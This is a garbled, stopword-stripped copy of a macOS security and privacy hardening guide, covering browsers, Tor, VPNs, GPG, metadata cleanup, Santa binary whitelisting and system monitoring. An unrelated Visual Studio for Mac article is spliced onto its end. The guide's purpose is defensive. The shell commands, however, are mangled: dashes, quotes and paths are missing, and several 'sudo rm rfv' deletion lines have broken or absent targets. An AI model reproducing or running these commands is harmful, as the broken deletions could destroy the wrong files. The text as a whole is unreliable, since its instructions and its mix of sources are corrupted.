risk fundamental job download execute untrusted code internet important statement unique use case web browser operation hostile environment forced adopt certain impressive security feature cornerstone web browser security origin policy sop word sop prevents malicious script one page obtaining access sensitive data another web page page document object model dom sop compromised security whole web browser compromised best tip ensure secure browsing regardless choice web browser proper security hygiene majority web browser exploit require social engineering attack achieve native code execution always mindful link click extra careful website ask download install software percent time software malware another important consideration web browser security web extension web extension greatly increase attack surface web browser issue plague firefox chrome alike luckily web extension access specific browser apis governed manifest mean quickly audit behavior remove request access information nt would ad blocker require camera access interest security best limit use web extension mozilla firefox google chrome safari tor browser covered guide web browser offer certain benefit drawback regarding security privacy best make informed choice necessarily commit one firefox mozilla firefox excellent browser well completely open source currently firefox renaissance period replaces major part infrastructure code base project quantum photon part quantum project replace c code rust rust system programming language focus security thread safety expected rust adoption greatly improve overall security posture firefox firefox offer similar security model chrome bug bounty program although lucrative chrome firefox follows sixweek release cycle similar chrome see discussion issue information certain difference firefox chrome firefox support usersupplied configuration file see drduhconfiguserjs pyllyukkouserjs ghacksuserjsghacksuserjs recommended preference hardening measure also see noscript extension allows whitelistbased preemptive script blocking firefox focused user privacy support tracking protection private browsing mode tracking protection enabled default account although may break browsing experience website another feature added privacy unique firefox container similar chrome profile previous version firefox used web extension sdk quite invasive offered immense freedom developer sadly freedom also introduced number vulnerability firefox greatly affected user find information vulnerability introduced firefox legacy extension paper pdf currently firefox support web extension web extension api similar chrome submission web extension firefox free web extension firefox time open source although certain web extension proprietary note similar chrome safari firefox allows account sync across multiple device stored login password encrypted firefox require password reveal plain text format firefox display yesno prompt important security issue keep mind sign firefox account device belong leave unattended issue raised among firefox community hopefully resolved coming version see drduhconfigfirefoxuserjs additional firefox configuration option improve security privacy chrome google chrome based open source chromium project certain proprietary component automatic update googlesoftwareupdatedaemon usage tracking crash reporting disabled chrome setting chrome web store adobe flash plugin support pepper api version adobe flash get updated automatically chrome medium codec support add support proprietary codecs chrome pdf viewer nonoptional tracking google chrome installer includes randomly generated token token sent google installation completes order measure success rate rlz identifier store information form encoded string like source chrome download installation week include personal information used measure effectiveness promotional campaign chrome downloaded google website rlz identifier source code decode string made open google chrome offer account sync multiple device part sync data stored website credential login password encrypted order access user google account password required use google account sign chrome customized setting device retaining security password chrome web store extension requires dollar lifetime fee order submit extension low cost allows development many quality open source web extension aim monetize usage chrome largest share global usage preferred target platform majority developer major technology based chrome open source component nodejs us chrome engine electron framework based chromium nodejs chrome vast user base make attractive target threat actor security researcher despite constant attack chrome retained impressive security track record year small feat chrome offer separate profile sandboxing frequent update including flash although disable see carry impressive credential addition google offer lucrative bounty program reporting vulnerability along project zero mean large number highly talented motivated people constantly auditing chrome code base create separate chrome profile reduce x risk compartmentalize cookiesidentities profile either disable javascript chrome setting manually whitelist allowed origin use ublock origin manage javascript andor disable thirdparty scriptsframes also install httpseverywhere upgrade insecure connection change default search engine google reduce additional tracking disable dns prefetching see also dns prefetching privacy implication pdf note chrome may attempt resolve dns using google public nameservers read chromium security chromium privacy detailed technical information read google privacy policy learn google service collect personal information user optout service see type information google stored account setting safari safari default web browser macos also optimized browser reducing battery use safari like chrome open source proprietary component safari based open source web engine webkit ubiquitous among macos ecosystem webkit used apple apps mail itunes ibooks app store chrome blink engine fork webkit engine share number similarity safari support certain unique feature benefit user security privacy content blocker enables creation content blocking rule without using javascript rule based approach greatly improves memory use security privacy safari introduced intelligent tracking prevention system feature automatically remove tracking data stored safari period noninteraction user tracker website similar chrome firefox safari offer invite bounty program bug reporting select number security researcher bounty program announced apple presentation blackhat web extension safari additional option use native code safari sandbox environment addition web extension apis web extension safari also distributed apple app store app store submission come added benefit web extension code audited apple hand app store submission come steep cost yearly developer subscription fee cost usd contrast chrome dollar lifetime fee firefox free submission high cost prohibitive majority open source developer result safari extension choose however keep high cost mind installing extension expected web extension way monetizing usage order cover developer cost wary web extension whose source code open safari syncs user preference saved password icloud keychain order viewed plain text user must input account password current device mean user sync data across device added security safari follows slower release cycle chrome firefox minor release major release per year newer feature slower adopted stable channel although security update safari handled independent stable release schedule issued automatically app store safari channel follows sixweek release cycle similar chrome firefox called safari technology preview recommended option instead stable channel safari excellent open source ad blocker safari fully leverage content blocker dgrahamkablock see also disable hyperlink auditing beacon web browser many chromiumderived browser recommended usually closed source poorly maintained bug make dubious claim protect privacy see private life chromium browser miscellaneous browser brave evaluated guide neither recommended actively discouraged use web browser privacy web browser retain certain information browsing habit information used number reason one improve overall performance web browser web browser offer prediction service resolve typo url redirections store analytics data browsing pattern crash report black listing known malicious server option turned web browser setting panel since web browser execute untrusted code server important understand type information accessed navigator interface give access information web browser user agent include information operating system web site permission device battery level information security conscious browsing type information leaked browser see howto privacy security conscious browsing browserleakscom eff panopticlick hinder third party tracker recommended disable thirdparty cooky web browser setting third party cookie cookie associated file requested different domain one user currently viewing time thirdparty cooky used create browsing profile tracking user movement web disabling thirdparty cooky prevents http response script domain setting cooky moreover cooky removed request domain document origin domain cooky sent current site viewed also aware webrtc may reveal local public connected vpn ip address e firefox chromechromium disabled extension ublock origin rentamobwebrtcleakprevent disabling webrtc safari possible system hack plugins adobe flash oracle java adobe reader microsoft silverlight netflix work plugins security risk installed necessary use disposable virtual machine subscribe security announcement make sure always patched see hacking team flash zeroday java trojan backdoorflashback acrobat reader security vulnerability angling silverlight exploit example tor tor anonymizing proxy used browsing web download tor browser tor project attempt configure browser application use tor may make mistake compromise anonymity download dmg asc signature file verify disk image signed tor developer cd downloads file tor compressed data block size pgp signature signature old gpg tor asc gpg ca nt check signature public key gpg recv gpg key public key tor browser developer signing key torbrowser torprojectorg imported gpg ultimately trusted key found gpg total number processed gpg imported gpg verify tor asc gpg assuming signed data gpg signature made mon dec pst gpg using rsa key gpg good signature tor browser developer signing key torbrowser torprojectorg unknown gpg warning key certified trusted signature gpg indication signature belongs owner primary key fingerprint subkey fingerprint make sure good signature tor browser developer signing key torbrowser torprojectorg appears output warning key certified benign yet manually assigned trust see verify signature package information finish installing tor browser open disk image drag application folder hdiutil mount cp r volumestor browsertor browserapp application verify tor application code signature made tor project apple developer id using spctl v andor pkgutil checksignature command spctl vv applicationstor browserapp usersdrduhapplicationstor browserapp accepted sourcedeveloper id origindeveloper id application tor project inc pkgutil checksignature applicationstor browserapp package tor browserapp status signed certificate trusted mac o x certificate chain developer id application tor project inc fingerprint developer id certification authority fingerprint fe fa apple root ca fingerprint ff df also use codesign command examine application code signature codesign dvv applicationstor browserapp executableusersdrduhapplicationstor browserappcontentsmacosfirefox identifierorgtorprojecttorbrowser formatapp bundle macho thin codedirectory none locationembedded library validation warningos x sdk version support library validation signature authoritydeveloper id application tor project inc authoritydeveloper id certification authority authorityapple root ca signed timedec infoplist sealed resource internal requirement view full certificate detail signed application extract codesign decode openssl codesign extractcertificates applicationstor browserapp executableusersdrduhapplicationstor browserappcontentsmacosfirefox file codesign data data data openssl inform der subject issuer startdate enddate noout subject id application tor project inc tor project inccus issuer cndeveloper id certification authorityouapple certification authorityoapple inccus notbeforeapr gmt notafterapr gmt openssl inform der fingerprint noout openssl inform der fingerprint noout fa ff tor traffic encrypted exit node ie read passive network eavesdropper tor use identified example tl handshake hostnames show plaintext sudo tcpdump tcp grep www listening pktap linktype pktap apple dltpktap capture size byte z w x c h u u see tor protocol specification tortlshistory information may wish additionally obfuscate tor traffic using pluggable transport sricslstegotorus done setting tor relay finding existing private public bridge serve obfuscating entry node extra security use tor inside virtualbox vmware virtualized gnulinux bsd machine finally remember tor network provides anonymity necessarily synonymous privacy tor network guarantee protection global observer capable traffic analysis correlation see also seeking anonymity internet panopticon pdf traffic correlation tor realistic adversary pdf also see invisible internet project tor comparison vpn unencrypted network traffic actively monitored possibly tampered encrypted traffic still expose connection metadata could used infer behavior specific action good idea use vpn outgoing network traffic split tunnel together trustworthy provider drduhdebianprivacyserverguide one many available guide setting personal vpn server nt blindly sign vpn service without understanding full implication traffic routed nt understand vpn work familiar software used probably better without choosing vpn service setting sure research protocol key exchange algorithm authentication mechanism type encryption used protocol pptp avoided favor openvpn linuxbased wireguard linux vm via set cross platform tool client may send traffic next available interface vpn interrupted disconnected see example allow traffic vpn another set script lock system access internet via vpn found part voodoo privacy project sarfatavoodooprivacy updated guide setting ipsec vpn virtual machine docker container may worthwhile consider geographical location vpn provider see discussion issue also see technical overview macos builtin vpn client open source openvpn clientsgui eddie pritunl evaluated guide neither recommended actively discouraged use pgpgpg pgp standard encrypting email end end mean chosen recipient decrypt message unlike regular email read forever archived provider gpg gnu privacy guard gpllicensed open source program compliant pgp standard gpg used verify signature software download install well symmetrically asymmetrically encrypt file text install homebrew brew install gnupg prefer graphical application download install gpg suite download drduhconfiggpgconf use recommended setting curl gnupggpgconf http rawgithubusercontentcomdrduhconfigmastergpgconf see drduhyubikeyguide securely generate store gpg key read online guide practice encrypting decrypting email friend get interested stuff otr otr stand offtherecord cryptographic protocol encrypting authenticating conversation instant messaging use otr top existing xmpp chat service even google hangout encrypts conversation user server using tl first time start conversation someone new asked verify public key fingerprint make sure person secure mean eg gpg encrypted mail popular macos gui client xmpp chat protocol adium xmpp client include profanity aglxmppclient another relatively new xmpp chat client coyim focused security builtin support otr tor want know otr work read paper offtherecord communication use pgp pdf virus malware everincreasing amount mac malware wild mac nt immune virus malicious software malware come bundled legitimate software java bundling ask toolbar illegitimate software macbackdooriworm bundled pirated program malwarebytes antimalware mac excellent program ridding oneself gardenvariety malware crapware see method malware persistence mac o x pdf malware persistence o x yosemite learn gardenvariety malware function could periodically run tool like knock knock examine persistent application eg script binary probably late maybe application block block ostiarius help see warning caveat issue first however opensource alternative could maclaunchsh antivirus program doubleedged sword useful advanced user likely increase attack surface sophisticated threat however possibly useful catching garden variety malware novice user mac also additional processing overhead consider using active scanning feature see sophail applied attack antivirus pdf analysis exploitation eset vulnerability trivial avast rce popular security software came relentless nsa gchq attack israel caught russian hacker scouring world u secret avg web tuneup extension multiple critical vulnerability therefore best antivirus common sense see discussion issue local privilege escalation bug plenty macos always careful downloading running untrusted program trusted program third party website downloaded http example subscribe update safe mac malwarebytes blog current mac security news scan application multiple av product examine behavior upload virustotal also check hacking team malware macos root installation macos support driver mac agent rcs agent mac good example advanced malware capability hide userland eg p l see brief analysis rcs implant installer reverseputas system integrity protection system integrity protection sip security feature since o x el capitan enabled default disabled may necessary change system setting deleting root certificate authority unloading certain launch daemon keep feature default new o x new security policy applies every running process including privileged code code run sandbox policy extends additional protection component disk runtime allowing system binary modified system installer software update code injection runtime attachment system binary longer permitted also see rootless feature el capitan really macbook hardware shipped sip disabled verify sip enabled use command csrutil status return system integrity protection status enabled otherwise enable sip recovery mode gatekeeper xprotect gatekeeper quarantine system try prevent unsigned bad program file running opening xprotect prevents execution known bad file outdated plugin version nothing cleanup stop existing malware offer trivial protection common risk fine default setting see also mac malware guide mac o x protect gatekeeper xprotect quarantine attribute note quarantine store information downloaded file may pose privacy risk examine file simply use string following command echo select datetime lsquarantinetimestamp unixepoch lsquarantinetimestamp lsquarantineagentname lsquarantineoriginurlstring lsquarantinedataurlstring lsquarantineevent user see information permanently disable feature clear file make immutable sudo chflags schg metadata artifact macos attache metadata hf extended attribute downloaded file viewed mdls xattr command l l rwr r drduh staff jan comapplemetadata kmditemwherefroms comapplequarantine mdls kmditemcontentcreationdate kmditemcontentcreationdateranking kmditemcontentmodificationdate kmditemcontenttype comapplediskimageudif kmditemcontenttypetree publicarchive publicitem publicdata publicdiskimage comapplediskimage comapplediskimageudif kmditemdateadded kmditemdateaddedranking kmditemdisplayname kmditemfscontentchangedate kmditemfscreationdate kmditemfscreatorcode kmditemfsfinderflags kmditemfshascustomicon null kmditemfsinvisible kmditemfsisextensionhidden kmditemfsisstationery null kmditemfslabel kmditemfsname kmditemfsnodecount null kmditemfsownergroupid kmditemfsowneruserid kmditemfssize kmditemfstypecode kmditeminterestingdateranking kmditemkind disk image kmditemwherefroms http http wwwtorprojectorgprojectstorbrowserhtmlen xattr l comapplemetadata kmditemwherefroms mht tps disttorpr ojectorgtorbro comapplequarantine google chromeapp metadata attribute also removed flag xattr comapplemetadata kmditemwherefroms xattr comapplequarantine xattr l output expected metadata artifact may found directory including limited librarypreferences librarycontainers app datalibrarypreferences librarypreferences detailed librarypreferencescomapplesidebarlistsplist contains historical list volume attached clear use command usrlibexecplistbuddy c delete systemitems volumeslist librarypreferencescomapplesidebarlistsplist librarypreferencescomapplebluetoothplist contains bluetooth metadata including device history bluetooth used metadata cleared sudo default delete librarypreferencescomapplebluetoothplist devicecache sudo default delete librarypreferencescomapplebluetoothplist idspaireddevices sudo default delete librarypreferencescomapplebluetoothplist pandevices sudo default delete librarypreferencescomapplebluetoothplist paninterfaces sudo default delete librarypreferencescomapplebluetoothplist scoaudiodevices varspoolcups contains cup printer job cache clear use command sudo rm rfv sudo rm rfv varspoolcupstmp sudo rm rfv varspoolcupscachejobcache clear list io device connected use sudo default delete user userlibrarypreferencescomappleipodplist last connect sudo default delete user userlibrarypreferencescomappleipodplist device sudo default delete librarypreferencescomappleipodplist last connect sudo default delete librarypreferencescomappleipodplist device sudo rm rfv vardblockdown quicklook thumbnail data cleared using qlmanage r cache command writes file resetreason quicklook directory state quicklook cache manually cleared disable thumbnail cache qlmanage r disablecache also manually cleared getting directory name getconf darwinusercachedir sudo getconf darwinusercachedir removing rm rfv getconf darwinusercachedir comapplequicklookthumbnailcacheexclusive rm rfv getconf darwinusercachedir comapplequicklookthumbnailcacheindexsqlite rm rfv getconf darwinusercachedir comapplequicklookthumbnailcacheindexsqliteshm rm rfv getconf darwinusercachedir comapplequicklookthumbnailcacheindexsqlitewal rm rfv getconf darwinusercachedir comapplequicklookthumbnailcacheresetreason rm rfv getconf darwinusercachedir comapplequicklookthumbnailcachethumbnailsdata similarly root user sudo rm rfv getconf darwinusercachedir comapplequicklookthumbnailcachethumbnailsfraghandler sudo rm rfv getconf darwinusercachedir comapplequicklookthumbnailcacheexclusive sudo rm rfv getconf darwinusercachedir comapplequicklookthumbnailcacheindexsqlite sudo rm rfv getconf darwinusercachedir comapplequicklookthumbnailcacheindexsqliteshm sudo rm rfv getconf darwinusercachedir comapplequicklookthumbnailcacheindexsqlitewal sudo rm rfv getconf darwinusercachedir comapplequicklookthumbnailcacheresetreason sudo rm rfv getconf darwinusercachedir comapplequicklookthumbnailcachethumbnailsdata sudo rm rfv getconf darwinusercachedir comapplequicklookthumbnailcachethumbnailsfraghandler also see quicklook cache may leak encrypted data clear finder preference default delete librarypreferencescomapplefinderplist fxdesktopvolumepositions default delete librarypreferencescomapplefinderplist fxrecentfolders default delete librarypreferencescomapplefinderplist recentmoveandcopydestinations default delete librarypreferencescomapplefinderplist recentsearches default delete librarypreferencescomapplefinderplist sgtrecentfilesearches additional diagnostic file may found following directory caution taken removing may break logging cause issue vardbcoreduet vardbdiagnostics vardbsystemstats vardbuuidtext varlogdiagnosticmessages macos stored preferred wifi data including credential nvram clear use following command sudo nvram currentnetwork sudo nvram preferrednetworks sudo nvram preferredcount macos may collect sensitive information type even user dictionary suggestion remove prevent created use following command rm rfv librarylanguagemodeling libraryspelling librarysuggestions chmod r librarylanguagemodeling libraryspelling librarysuggestions chflags r uchg librarylanguagemodeling libraryspelling librarysuggestions quicklook application support metadata cleared locked following command rm rfv libraryapplication supportquick look chmod r libraryapplication supportquick look chflags r uchg libraryapplication supportquick look document revision metadata stored cleared locked following command caution taken may break core apple application sudo rm rfv sudo chmod r sudo chflags r uchg saved application state metadata may cleared locked following command rm rfv librarysaved application state rm rfv librarycontainers appname saved application state chmod r librarysaved application state chmod r librarycontainers appname saved application state chflags r uchg librarysaved application state chflags r uchg librarycontainers appname saved application state autosave metadata cleared locked following command rm rfv librarycontainers app datalibraryautosave information rm rfv libraryautosave information chmod r librarycontainers app datalibraryautosave information chmod r libraryautosave information chflags r uchg librarycontainers app datalibraryautosave information chflags r uchg libraryautosave information siri analytics database created even siri launch agent disabled cleared locked following command rm rfv libraryassistantsirianalyticsdb chmod r libraryassistantsirianalyticsdb chflags r uchg libraryassistantsirianalyticsdb librarypreferencescomappleitunesplist contains itunes metadata recent itunes search data may cleared following command default delete librarypreferencescomappleitunesplist recentsearches use apple idlinked service following key may cleared using following command default delete librarypreferencescomappleitunesplist storeuserinfo default delete librarypreferencescomappleitunesplist wirelessbuddyid medium played quicktime player found librarycontainerscomapplequicktimeplayerxdatalibrarypreferencescomapplequicktimeplayerxplist additional metadata may exist following file librarycontainerscomappleappstoredatalibrarypreferencescomapplecommerceknownclientsplist librarypreferencescomapplecommerceplist librarypreferencescomapplequicktimeplayerxplist password generate strong password several program directly devurandom openssl rand gpg genrandom fold w langc tr dc devurandom fold w head n tr dc alnum devurandom fold w head tr dc lower devurandom fold w head gfvkanntxutzwxficgvavbwdvttexdezdftvvtmn lgrsuiugwkqbtbkyggcbpbqlynwbiyxzlabstqcf ufctdlsbyonkowzpmotxiksnsbwdzkjrjsupoqvr hjwibdjxtmuvqricljayzkgdfztcmapsgwsubggr bjstlmvwjczakgeetkbmwbjnidbeaerhaonpkacg tr dc upper devurandom fold w head euhzmaobolnfxunndstljtpdcpvqbpueqolrzuqz hvnvkbepaaymxrcgvcnezlfhnuymryptwpwoozvm taheupqjtsyqvjvyskluresmkwezonxludhwqodb prditwmaxxzltrxeeogosgawuxydgdrjyrhuwicm vheriqblbphsiuzsgyzrdhtnapugjmrodikbwzrj tr dc graph devurandom fold w head c b q ol j mmdbaggdp zrsqo w ngxx c zogumbd iinvfkit dqyo cddk v stx w igg urd fndifiq h oal also generate password even memorable one using keychain access password assistant command line equivalent like anderspwgen keychains encrypted derived key pretty safe place store credential see also breaking o x keychain also aware keychain encrypt name corresponding password entry alternatively manage encrypted password file gnupg see drduhpurse drduhpwdsh example addition password ensure eligible online account github google account banking two factor authentication enabled yubikey offer affordable hardware token see drduhyubikeyguide trmmnetyubikey one two yubikey slot also programmed emit long static password used combination short memorized password example addition login pams use yubikey secure login sudo pdf guide yubico yubikey bit pricey cheaper alternative capable zero great guide set backup always encrypt file locally backing external medium online service one way use symmetric cipher gpg password choosing file also encrypted public key gpg private key stored yubikey compress encrypt directory tar zcvf downloads gpg c desktopbackup date f h targzgpg tar removing leading member name usersdrduhdownloads usersdrduhdownloadsdsstore usersdrduhdownloadslocalized decrypt decompress directory gpg desktopdecryptedbackuptargz gpg encrypted data gpg encrypted passphrase tar zxvf desktopdecryptedbackuptargz tar removing leading member name x usersdrduhdownloads x usersdrduhdownloads x usersdrduhdownloadsdsstore x usersdrduhdownloadsdsstore x usersdrduhdownloadslocalized x x x x also create use encrypted volume using disk utility hdiutil hdiutil create desktopencrypteddmg encryption size volname secretstuff f jhfs enter new password secure encrypteddmg reenter new password created usersdrduhdesktopencryptedimg hdiutil mount desktopencrypteddmg enter password access encrypteddmg volumessecretstuff cp v documentspasswordstxt volumessecretstuff hdiutil eject volumessecretstuff unmounted ejected hdiutil also able add option type sparsebundle sparse bundle may achieve faster backup first run updated information padding need transferred simple way synchronize encrypted folder another server using rsync rsync recursive time progress delete verbose stats myencrypteddrivesparsebundle user server pathtobackup see also following application service tresorit spideroak arq espionage restic wifi macos remembers access point connected like wireless device mac broadcast access point name remembers eg myhomenetwork time look network waking sleep privacy risk remove network list system preference network advanced longer needed also see signal crowd uncovering social relationship smartphone probe pdf wifi told everything pdf saved wifi information ssid last connection etc found librarypreferencessystemconfigurationcomappleairportpreferencesplist may want spoof mac address network card connecting new untrusted wireless network mitigate passive fingerprinting sudo ifconfig ether openssl rand hex sed g macos store wifi ssids password nvram order recovery mode access internet sure either clear nvram deauthenticate mac apple account clear nvram passing mac along resetting smc clear nvram note mac address reset hardware default boot finally wep protection wireless network secure connect protected network possible ssh outgoing ssh connection use hardware passwordprotected key set remote host consider hashing added privacy see drduhconfigsshconfig recommended client option also use ssh create encrypted tunnel send traffic similar vpn example use privoxy running remote host port ssh c l remotehosttld sudo networksetup setwebproxy wifi sudo networksetup setsecurewebproxy wifi use ssh connection sock proxy ssh ncd remotehosttld default macos sshd remote login enabled enable sshd allow incoming ssh connection sudo launchctl load w systemlibrarylaunchdaemonssshplist use system preference sharing menu enabling sshd sure disable password authentication consider hardening configuration see drduhconfigsshdconfig recommended option confirm whether sshd running physical access keep mac physically secure time nt leave unattended public space hotel skilled attacker unsupervised physical access computer infect boot rom install keylogger steal password example see thunderstrike helpful tool usbkill antiforensic killswitch wait change usb port immediately shuts computer consider purchasing privacy filter screen thwart shoulder surfer superglues epoxy resin also used disable physical access computer port nail polish tamperevidence seal applied component detect tampering system monitoring openbsm audit macos powerful openbsm basic security module auditing capability use monitor process execution network activity much tail audit log use praudit utility sudo praudit l devauditpipe execve thu sep msec exec arg applicationsevilapprootkit path applicationsevilapprootkit path applicationsevilapprootkit root subject drduh root wheel root return connect thu sep msec fd subject drduh root wheel root return failure operation openssh thu sep msec subjectex drduh drduh staff drduh text successful login drduh return see manual page audit praudit auditcontrol file etcsecurity note although man audit say flag synchronize audit configuration appears necessary reboot change take effect see article ilostmynotesblogspotcom derflounderwordpresscom information dtrace note system integrity protection interferes dtrace possible use recent macos version without disabling sip iosnoop monitor disk io opensnoop monitor file open execsnoop monitor execution process errinfo monitor failed system call dtruss monitor system call see man k dtrace information execution p ef list information running process also view process activity monitor launchctl list sudo launchctl list list loaded running user system launch daemon agent network list open network file list content various networkrelated data structure wireshark used command line tshark monitor dns query reply tshark dnsflagsresponse tfields e frametimedelta e dnsqryname e dnsa eseparator monitor http request response tshark httprequest httpresponse tfields e ipdst e httprequestfulluri e httprequestmethod e httpresponsecode e httpresponsephrase eseparators monitor ssltls certificate tshark sslhandshakecertificate tfields e ipsrc e e e e e eseparators equoted also see simple networking monitoring application bonzaithepenguinloading binary whitelisting googlesanta security software developed google corporate macintosh fleet open sourced santa binary whitelistingblacklisting system macos consists kernel extension monitor execution userland daemon make execution decision based content sqlite database gui agent notifies user case block decision commandline utility managing system synchronizing database server santa us kernel authorization api monitor allowdisallow binary executing kernel binary white blacklisted unique hash signing developer certificate santa used allow trusted code execution blacklist known malware executing mac similar software window note santa currently graphical user interface managing rule following instruction advanced user install santa visit release page download latest disk image mount install contained package hdiutil mount sudo installer pkg tgt default santa installs monitor mode meaning nothing get blocked logged come two rule one apple binary another santa software verify santa running kernel module loaded santactl status daemon info mode monitor file logging watchdog cpu event peak watchdog ram event peak kernel info kernel cache count database info binary rule certificate rule event pending upload p ef grep anta libraryextensionssantadriverkextcontentsmacossantad syslog kextstat grep santa comgooglesantadriver create blacklist rule prevent itunes executing sudo santactl rule blacklist path applicationsitunesapp added rule try launch itunes blocked open applicationsitunesapp lsopenurlswithrole failed error file applicationsitunesapp remove rule sudo santactl rule remove path applicationsitunesapp removed rule open itunes open applicationsitunesapp itunes open successfully create new example c program cat eof fooc include stdioh main printf hello worldn eof compile program gcc requires installation xcode commandline tool gcc foo fooc file foo foo macho executable codesign foo foo code object signed run toggle santa lockdown mode allows whitelisted binary run sudo default write vardbsantaconfigplist clientmode int try run unsigned binary foo bash foo operation permitted santa following application blocked executing trustworthiness determined path usersdemouserfoo identifier parent bash whitelist specific binary determine sum santactl fileinfo usersdemouserfoo path usersdemouserfoo type executable codesigned rule blacklisted unknown add whitelist rule sudo santactl rule whitelist added rule run allowed work application also whitelisted developer certificate new binary version need manually whitelisted update example download run google chrome blocked santa lockdown mode curl http dlgooglecomchromemacstableggrogooglechromedmg hdiutil mount googlechromedmg cp r volumesgoogle chromegoogle chromeapp application open applicationsgoogle chromeapp lsopenurlswithrole failed error file applicationsgoogle chromeapp whitelist application developer certificate first item signing chain santactl fileinfo applicationsgoogle chromeapp path applicationsgoogle chromeappcontentsmacosgoogle chrome bundle name google chrome bundle version bundle version str type executable codesigned yes rule blacklisted unknown signing chain common name developer id application google inc organization google inc organizational unit valid valid common name developer id certification authority organization apple inc organizational unit apple certification authority valid valid common name apple root ca organization apple inc organizational unit apple certification authority valid valid case google apple developer certificate team id whitelist sudo santactl rule whitelist certificate added rule google chrome launch subsequent update application continue work long code signing certificate change expire disable lockdown mode sudo default delete vardbsantaconfigplist clientmode see varlogsantalog monitor allow deny execution decision log configuration server santa available zentral open source event monitoring solution tl server osquery santa zentral support santa monitoring lockdown operation mode client need enrolled tl connection sync santa rule santa event endpoint aggregated logged back zentral santa event trigger action notification within zentral framework note python bash interpreter whitelisted since signed apple developer certificate santa able block script executing thus potential nonbinary program disables santa weakness vulnerability since design take note miscellaneous disable diagnostics usage data want play music watch video use vlc medium player free open source want use torrent use transmission free open source note like software even open source project malware may still find way may also wish use block list avoid peering known bad host see best blocklist transmission manage default file handler duti installed brew install duti one reason manage extension prevent automounting remote file system finder see protecting sparklegate several recommended file handler manage duti comapplesafari afp duti comapplesafari ftp duti comapplesafari nfs duti comapplesafari smb duti comappletextedit publicunixexecutable monitor system log console application syslog w usrbinlog stream command system prior macos sierra enable ttytickets flag etcsudoers restrict sudo session terminal windowtab started use sudo visudo add line default ttytickets set screen lock soon screensaver start default write comapplescreensaver askforpassword int default write comapplescreensaver askforpassworddelay int expose hidden file library folder finder default write comapplefinder appleshowallfiles bool true chflags nohidden library show filename extension eviljpgapp masquerade easily default write nsglobaldomain appleshowallextensions bool true nt default saving document icloud default write nsglobaldomain nsdocumentsavenewdocumentstocloud bool false enable secure keyboard entry terminal unless use yubikey application textexpander disable crash reporter dialog appears application crash prompt report problem apple default write comapplecrashreporter dialogtype none disable bonjour multicast advertisement sudo default write librarypreferencescomapplemdnsresponderplist nomulticastadvertisements bool yes disable handoff bluetooth feature nt necessary consider sandboxing application see fg sandbox guide pdf seatbelt profile know apple shipped computer tpm since macos come line etcsudoers default envkeep home mail stop sudo changing home variable elevate privilege mean execute root bash dotfiles nonroot user home directory run sudo bash advisable comment line avoid potentially easy way malware local attacker escalate privilege root want retain convenience root user nonroot user home directory append export line varrootbashrc eg set custom umask sudo launchctl config user umask reboot create file finder verify permission macos default allows groupother read access l ld umask drwx kevin staff dec umasktestingdir rw kevin staff dec umasktestingfile related software cisofylynis crossplatform security auditing tool assist compliance testing system hardening dylib hijack scanner scan application either susceptible dylib hijacking hijacked fsecure xfence formerly little flocker little snitch file prevents application accessing file lockdown audit remediates security configuration setting zentral log configuration server santa osquery run audit probe inventory event logfiles combine pointintime alerting full framework django web server build top elastic stack formerly known elk stack facebookosquery used retrieve low level system information user write sql query retrieve system information googlegrr incident response framework focused remote live forensics jipegitosxauditor analyzes artifact running system quarantined file safari chrome firefox history downloads database localstore social medium email account wifi access point name kristovatlasosxconfigcheck check osx machine various hardened configuration setting libyallibfvde library access filevault drive encryption fvde encrypted volume stronghold securely easily configure mac terminal inspired guide yelposxcollector forensic evidence collection analysis toolkit o x eclectic light company downloads collection useful diagnostics control application utility macos additional resource
500,Lobsters,mac,Apple macOS,Visual Studio for Mac,https://msdn.microsoft.com/en-us/magazine/mt790182.aspx,visual studio mac,article visual studio development introducing visual studio mac mikayla hutchinson new member visual studio family mobilefirst cloudfirst development io android mac figure figure xamarinforms xaml live preview cuttingedge cloud familiar workspace figure figure visual studio mac workspace figure figure intellisense net core project xmnioxsexpert open source core creating aspnet core app figure figure debugging net core project aspnetgetstarted developerxamarincom wrapping visualstudiocom mikayla hutchinson mjhutchinson discus article msdn magazine forum,minute read article connect volume number visual studio development introducing visual studio mac mikayla hutchinson connect november microsoft launching preview visual studio mac exciting development evolving mobilecentric xamarin studio ide true mobilefirst cloudfirst development tool net c bringing visual studio development experience mac new member visual studio family heart visual studio mac macos counterpart window version visual studio enjoy visual studio development experience need want use macos feel right home ux inspired visual studio yet designed look feel like native citizen macos like visual studio window complemented visual studio code time need full ide want lightweight yet rich standalone source editor surface visual studio mac also lot common sibling visual studio family intellisense refactoring use roslyn compiler platform project system build engine use msbuild source editor support textmate bundle us debugger engine xamarin net core apps designer xamarinios xamarinandroid compatibility key focus visual studio mac although new product support visual studio project type common us msbuild solution project format team member macos window switch two os seamlessly share project across platform need conversion migration mobilefirst cloudfirst development primary workload supported visual studio mac native io android mac development via xamarin server development via net core azure integration give tool need develop rich native mobile app experience user expect today cloudbased server back end power powered c language know love latest c productivity enhancement get performance compiled code productivity modern typesafe language access unique feature platform rich ecosystem library tool use existing experience across mobile cloud domain sharing code client server project one solution take advantage solutionwide crossproject refactoring code navigation c language supported visual studio mac preview functional programmer among includes excellent f support powered f compiler used visual studio io android mac fragmented mobile market today important able target wide range device based xamarin studio visual studio mac mature support c based io android mac development xamarin platform take advantage existing c experience library share common code across platform full access native apis build fast polished native app experience even greater code sharing use crossplatform xamarinforms ui library provides familiar xamlbased development environment target multiple platform including io android macos universal window platform uwp uwp development currently supported visual map native ui platform need control mix match xamarinforms direct access native toolkits huge ecosystem library available xamarin via nuget including platformspecific library binding native code portable net standard library like visual studio visual studio mac draganddrop designer io android development let rapidly assemble finetune ui xamarinforms rich xaml intellisense sidebyside live preview figure show designer live preview use simulator render app exactly appear device even work custom control figure xamarinforms xaml live preview cuttingedge cloud almost every mobile app backed service visual studio mac make easy develop service support latest aspnet core web development platform aspnet core run net core latest evolution net framework runtime tuned blazingly fast performance factored small install size reimagined run linux macos well window net core give huge degree flexibility develop deploy server application whether datacenter cloud platform microsoft azure net core xamarin platform open source worry vendor lockin visual studio mac support net core project also allows write net standard library new way share code across net platform going forward net standard library replace portable class library pcls offer much broader api surface area net core xamarin platform net standardcompliant great way share code within solution via nuget package manager familiar workspace visual studio mac workspace familiar existing visual studio developer first open see welcome page list recently opened solution feed developer news information help get started create new solution go file menu select new project see workspace containing new solution see figure central tabbed source editor number docked window around solution output property document outline toolbox like visual studio layout highly customizable switch automatically depending whether coding debugging using draganddrop designer figure visual studio mac workspace toolbar familiar notable difference left run button dropdown select active configuration well dropdowns select run configuration target device crossplatform mobile development important able easily switch device simulator testing debugging app run configuration like startup project visual studio 